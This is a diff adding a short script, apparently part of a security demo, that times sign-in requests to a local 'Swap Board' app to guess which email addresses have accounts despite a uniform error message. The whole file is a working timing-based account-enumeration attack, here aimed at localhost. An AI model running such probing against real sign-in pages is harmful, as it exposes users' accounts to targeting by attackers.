@@ -1,0 +1,17 @@
+// The attacker's script: who has an account on Swap Board? The page says the same for everyone now, so it times
+// each answer instead: the fastest of three tries, in milliseconds.
+//   .quillo/bin/quillo run attacks/find-members.qwe
+let NAMES = ["amy", "ana", "ben", "bob", "cara", "dan", "eve", "finn", "lena", "rosa", "sam", "zoe"]
+let FORM = { "content-type": "application/x-www-form-urlencoded" }
+
+fn timed(email: str) -> int with http, time {
+    let start = now()
+    http.post("http://localhost:8080/sign-in", `email=${url_encode(email)}&password=guess`, FORM)
+    now() - start
+}
+
+for name in NAMES {
+    let email = `${name}@example.com`
+    let ms = [timed(email), timed(email), timed(email)] | min
+    print(`${email}  ${ms} ms`)
+}
